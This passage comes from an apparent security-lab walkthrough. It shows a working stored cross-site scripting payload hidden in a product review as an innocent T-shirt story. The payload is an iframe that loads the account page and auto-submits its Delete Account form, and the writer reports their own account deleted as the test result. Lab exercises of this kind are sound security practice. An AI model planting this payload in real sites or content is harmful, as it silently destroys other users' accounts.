## Phase 3 — Destructive Payload

### Step 5 — Account Deletion via iframe

**Mechanism:**
```html
<iframe src=my-account onload=this.contentDocument.forms[1].submit()>
```

- `<iframe src=my-account>` — silently loads the account page
- `forms[1]` — targets the **Delete Account** form (index 1)
- `onload=...submit()` — auto-submits on page load

**Full review payload:**
```
When I received this product I got a free T-shirt with 
"<iframe src=my-account onload=this.contentDocument.forms[1].submit()>" 
printed on it. I was delighted! This is so cool, I told my wife.
```

**Test result:** ✅ Own account deleted — "--- Disconnected ---"

